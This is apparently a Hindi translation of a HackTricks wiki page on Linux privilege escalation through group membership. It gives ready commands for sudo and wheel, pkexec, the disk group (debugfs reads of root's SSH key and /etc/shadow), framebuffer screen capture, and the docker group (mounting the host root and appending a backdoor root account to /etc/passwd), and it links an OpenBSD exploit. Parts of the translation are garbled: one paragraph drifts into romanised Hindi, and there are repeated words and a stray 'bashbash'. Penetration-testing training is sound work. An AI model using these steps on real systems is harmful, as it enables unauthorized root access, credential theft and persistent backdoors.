# दिलचस्प समूह - लिनक्स प्रिविलेज इस्केलेशन

<details>

<summary><strong>जानें AWS हैकिंग को शून्य से हीरो तक</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> के साथ!</strong></summary>

HackTricks का समर्थन करने के अन्य तरीके:

* यदि आप अपनी **कंपनी का विज्ञापन HackTricks में देखना चाहते हैं** या **HackTricks को PDF में डाउनलोड करना चाहते हैं** तो [**सब्सक्रिप्शन प्लान्स देखें**](https://github.com/sponsors/carlospolop)!
* [**आधिकारिक PEASS & HackTricks स्वैग**](https://peass.creator-spring.com) प्राप्त करें
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) की खोज करें, हमारा विशेष [**NFTs**](https://opensea.io/collection/the-peass-family) संग्रह
* **शामिल हों** 💬 [**डिस्कॉर्ड समूह**](https://discord.gg/hRep4RUj7f) या [**टेलीग्राम समूह**](https://t.me/peass) या हमें **ट्विटर** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)** पर फॉलो** करें।
* **हैकिंग ट्रिक्स साझा करें, PRs सबमिट करके** [**HackTricks**](https://github.com/carlospolop/hacktricks) और [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos में।

</details>

## सुडो/व्यवस्थापक समूह

### **PE - विधि 1**

**कभी-कभी**, **डिफ़ॉल्ट रूप से (या क्योंकि कुछ सॉफ़्टवेयर की आवश्यकता है)** आप **/etc/sudoers** फ़ाइल में इन पंक्तियों में से कुछ पा सकते हैं:
```bash
# Allow members of group sudo to execute any command
%sudo	ALL=(ALL:ALL) ALL

# Allow members of group admin to execute any command
%admin 	ALL=(ALL:ALL) ALL
```
इसका मतलब है कि **किसी भी उपयोगकर्ता जो सूडो या एडमिन समूह में शामिल है, वह सूडो के रूप में कुछ भी चला सकता है**।

यदि ऐसा है, तो **रूट बनने के लिए आप बस निम्नलिखित को चला सकते हैं**:
```
sudo su
```
### PE - विधि 2

सभी suid बाइनरी खोजें और जांचें कि क्या बाइनरी **Pkexec** है:
```bash
find / -perm -4000 2>/dev/null
```
यदि आपको पता चलता है कि बाइनरी **pkexec एक SUID बाइनरी है** और आप **sudo** या **admin** समूह में शामिल हैं, तो आप `pkexec` का उपयोग करके बाइनरी को sudo के रूप में चला सकते हैं।\
यह इसलिए है क्योंकि आम तौर पर ये समूह **polkit नीति** के अंदर होते हैं। यह नीति आम तौर पर यह निश्चित करती है कि कौन-कौन से समूह `pkexec` का उपयोग कर सकते हैं। इसे निम्नलिखित के साथ जांचें:
```bash
cat /etc/polkit-1/localauthority.conf.d/*
```
वहाँ आपको मिलेगा कि कौन से समूहों को **pkexec** और **डिफ़ॉल्ट** में कुछ लिनक्स डिस्ट्रो में समूह **sudo** और **admin** को निषेधित किया गया है।

**रूट बनने के लिए आप निम्नलिखित को चला सकते हैं**:
```bash
pkexec "/bin/sh" #You will be prompted for your user password
```
यदि आप **pkexec** को execute करने का प्रयास करते हैं और आपको यह **त्रुटि** मिलती है:
```bash
polkit-agent-helper-1: error response to PolicyKit daemon: GDBus.Error:org.freedesktop.PolicyKit1.Error.Failed: No session for cookie
==== AUTHENTICATION FAILED ===
Error executing command as another user: Not authorized
```
**यह इसलिए नहीं है कि आपके पास अनुमतियाँ नहीं हैं, बल्कि इसलिए कि आप GUI के बिना कनेक्ट नहीं हैं**। और इस मुद्दे का एक काम करने का तरीका यहाँ है: [https://github.com/NixOS/nixpkgs/issues/18012#issuecomment-335350903](https://github.com/NixOS/nixpkgs/issues/18012#issuecomment-335350903)। आपको **2 अलग-अलग ssh सत्र** की आवश्यकता है:

{% code title="session1" %}
```bash
echo $$ #Step1: Get current PID
pkexec "/bin/bash" #Step 3, execute pkexec
#Step 5, if correctly authenticate, you will have a root session
```
{% endcode %}

{% code title="session2" %}
```bash
pkttyagent --process <PID of session1> #Step 2, attach pkttyagent to session1
#Step 4, you will be asked in this session to authenticate to pkexec
```
{% endcode %}

## व्हील समूह

**कभी-कभी**, **डिफ़ॉल्ट** रूप से **/etc/sudoers** फ़ाइल के अंदर आप यह पंक्ति पा सकते हैं:
```
%wheel	ALL=(ALL:ALL) ALL
```
Yah yah yah ki **koi bhi upayogakarta jo wheel samuh mein shamil hai, vah sudo ke roop mein kuch bhi chala sakta hai**.

Yadi aisa hai, to **root banne ke liye bas yah chalao**:
```
sudo su
```
## शैडो ग्रुप

**शैडो ग्रुप** से उपयोगकर्ता **/etc/shadow** फ़ाइल **पढ़** सकते हैं:
```
-rw-r----- 1 root shadow 1824 Apr 26 19:10 /etc/shadow
```
## डिस्क समूह

यह विशेषाधिकार लगभग **रूट एक्सेस के समान** है क्योंकि आप मशीन के अंदर सभी डेटा तक पहुंच सकते हैं।

फ़ाइलें: `/dev/sd[a-z][1-9]`
```bash
df -h #Find where "/" is mounted
debugfs /dev/sda1
debugfs: cd /root
debugfs: ls
debugfs: cat /root/.ssh/id_rsa
debugfs: cat /etc/shadow
```
ध्यान दें कि debugfs का उपयोग करके आप **फ़ाइलें लिख सकते हैं**। उदाहरण के लिए `/tmp/asd1.txt` की प्रतिलिपि `/tmp/asd2.txt` में कॉपी करने के लिए आप यह कर सकते हैं:
```bash
debugfs -w /dev/sda1
debugfs:  dump /tmp/asd1.txt /tmp/asd2.txt
```
फिर भी, अगर आप **रूट के स्वामित्व वाली फ़ाइलें लिखने** की कोशिश करें (जैसे `/etc/shadow` या `/etc/passwd`) तो आपको "**अनुमति नामंजूर**" त्रुटि आएगी।

## वीडियो समूह

`w` कमांड का उपयोग करके आप **सिस्टम पर कौन लॉग इन है** यह पता लगा सकते हैं और यह निम्नलिखित तरह का आउटपुट दिखाएगा:
```bash
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
yossi    tty1                      22:16    5:13m  0.05s  0.04s -bash
moshe    pts/1    10.10.14.44      02:53   24:07   0.06s  0.06s /bin/bash
```
**tty1** का मतलब है कि उपयोगकर्ता **yossi भौतिक रूप से** मशीन पर एक टर्मिनल में लॉग इन हैं।

**वीडियो समूह** को स्क्रीन आउटपुट देखने का अधिकार है। मूल रूप से आप स्क्रीन पर मौजूदा छवि को रॉ डेटा में पकड़ने की आवश्यकता है और स्क्रीन द्वारा उपयोग की जा रही रिज़ॉल्यूशन प्राप्त करनी है। स्क्रीन डेटा को `/dev/fb0` में सहेजा जा सकता है और आप इस स्क्रीन की रिज़ॉल्यूशन को `/sys/class/graphics/fb0/virtual_size` पर पा सकते हैं।
```bash
cat /dev/fb0 > /tmp/screen.raw
cat /sys/class/graphics/fb0/virtual_size
```
**खोलने** के लिए **रॉ इमेज** का उपयोग करें आप **GIMP** का उपयोग कर सकते हैं, **`screen.raw`** फ़ाइल का चयन करें और फ़ाइल प्रकार के रूप में **रॉ इमेज डेटा** का चयन करें:

![](<../../../.gitbook/assets/image (287) (1).png>)

फिर चौड़ाई और ऊचाई को स्क्रीन पर उपयोग किए जाने वाले वाले वाले और विभिन्न छवि प्रकारों को जांचें (और उसे चुनें जो स्क्रीन को बेहतर दिखाता है):

![](<../../../.gitbook/assets/image (288).png>)

## रूट समूह

ऐसा लगता है कि डिफ़ॉल्ट रूप समूह के **सदस्य** को कुछ **सेवा** कॉन्फ़िगरेशन फ़ाइल्स या कुछ **लाइब्रेरी** फ़ाइल्स या **अन्य दिलचस्प चीजें** तक पहुंच हो सकती हैं जो वर्चस्व उन्नति के लिए उपयोग की जा सकती हैं...

**जांचें कि रूट सदस्य कौन-कौन सी फ़ाइलें संशोधित कर सकते हैं**:
```bash
find / -group root -perm -g=w 2>/dev/null
```
## डॉकर समूह

आप **मेज़बान मशीन के रूट फ़ाइल सिस्टम को एक इंस्टेंस के वॉल्यूम में माउंट कर सकते हैं**, इसलिए जब इंस्टेंस शुरू होता है तो वह तुरंत उस वॉल्यूम में `chroot` लोड करता है। यह आपको मशीन पर रूट देता है।
```bash
docker image #Get images from the docker service

#Get a shell inside a docker container with access as root to the filesystem
docker run -it --rm -v /:/mnt <imagename> chroot /mnt bash
#If you want full access from the host, create a backdoor in the passwd file
echo 'toor:$1$.ZcF5ts0$i4k6rQYzeegUkacRCvfxC0:0:0:root:/root:/bin/sh' >> /etc/passwd

#Ifyou just want filesystem and network access you can startthe following container:
docker run --rm -it --pid=host --net=host --privileged -v /:/mnt <imagename> chroot /mnt bashbash
```
अंत में, यदि आप पहले किसी सुझाव से संतुष्ट नहीं हैं, या किसी कारणवश काम नहीं कर रहे हैं (डॉकर एपीआई फ़ायरवॉल?) तो आप हमेशा **एक प्रिविलेज्ड कंटेनर चला सकते हैं और उससे बाहर निकल सकते हैं** जैसा यहाँ विवरणित है:

{% content-ref url="../docker-security/" %}
[docker-security](../docker-security/)
{% endcontent-ref %}

यदि आपके पास डॉकर सॉकेट पर लेखन अनुमतियाँ हैं तो [**इस पोस्ट को पढ़ें जिसमें डॉकर सॉकेट का दुरुपयोग करके प्रिविलेज उन्नति कैसे की जाए**](../#writable-docker-socket)**.**

{% embed url="https://github.com/KrustyHack/docker-privilege-escalation" %}

{% embed url="https://fosterelli.co/privilege-escalation-via-docker.html" %}

## lxc/lxd समूह

{% content-ref url="./" %}
[.](./)
{% endcontent-ref %}

## Adm समूह

सामान्यत: **समूह** के **सदस्य** को **`adm`** समूह की अनुमतियाँ होती हैं जो _/var/log/_ में स्थित लॉग फ़ाइलें पढ़ने की अनुमति देती हैं।\
इसलिए, यदि आप इस समूह के अंदर किसी उपयोगकर्ता को कंप्रोमाइज कर चुके हैं तो आपको निश्चित रूप से **लॉग्स की जाँच करनी चाहिए**।

## Auth समूह

OpenBSD के अंदर, **auth** समूह आम तौर पर फ़ोल्डर _**/etc/skey**_ और _**/var/db/yubikey**_ में लिख सकता है अगर वे उपयोग किए जाते हैं।\
इन अनुमतियों का उपयोग निम्नलिखित एक्सप्लॉइट के साथ किया जा सकता है **प्रिविलेज उन्नति** के लिए: [https://raw.githubusercontent.com/bcoles/local-exploits/master/CVE-2019-19520/openbsd-authroot](https://raw.githubusercontent.com/bcoles/local-exploits/master/CVE-2019-19520/openbsd-authroot)
